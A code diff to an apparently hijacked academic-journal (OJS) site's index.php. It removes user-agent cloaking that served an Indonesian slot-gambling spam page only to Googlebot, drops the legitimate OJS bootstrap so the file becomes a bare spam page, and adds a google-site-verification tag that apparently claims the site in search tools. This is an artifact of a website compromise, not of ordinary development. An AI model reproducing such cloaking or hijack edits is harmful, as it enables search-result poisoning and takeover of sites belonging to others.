@@ -1,8 +1,3 @@
-<?php
-
-if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
-{
-?>
 <!DOCTYPE html>
 <html lang="id">
 
@@ -29,6 +24,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
         content="TIP4D menjadi sumber informasi situs slot gacor dengan referensi RTP slot bet 200 dan berbagai pilihan permainan populer. Temukan informasi RTP, rekomendasi permainan, provider slot, serta update terbaru yang tersedia hari ini. Nikmati akses informasi slot online secara praktis dengan pembahasan yang lengkap dan mudah dipahami, sehingga Anda dapat mengikuti perkembangan permainan dan informasi RTP terkini dalam satu sumber.">
     <meta name="keywords"
         content="SLOT88, SITUS GACOR, SLOT MAXWIN, slot gacor, SLOT THAILAND, situs slot gacor, SLOT88 togel, SLOT88 slot, SLOT88 daftar, situs SLOT88">
+    <meta name="google-site-verification" content="D89NABxjjzsT_lieTQPR9DTW9er3WB8x24mB-4nG5AI" />
     <meta name="distribution" content="Global" />
     <meta name="rating" content="general" />
     <meta name="geo.region" content="ID" />
@@ -9601,28 +9597,3 @@ function myFunction() {
 </body>
 
 </html>
-<?php
-exit;
-}
-?>
-<?php
-
-/**
- * @file index.php
- *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * Bootstrap code for OJS site. Loads required files and then calls the
- * dispatcher to delegate to the appropriate request handler.
- */
-
-use APP\core\Application;
-
-// Initialize global environment
-define('INDEX_FILE_LOCATION', __FILE__);
-require_once './lib/pkp/includes/bootstrap.php';
-
-// Serve the request
-Application::get()->execute();
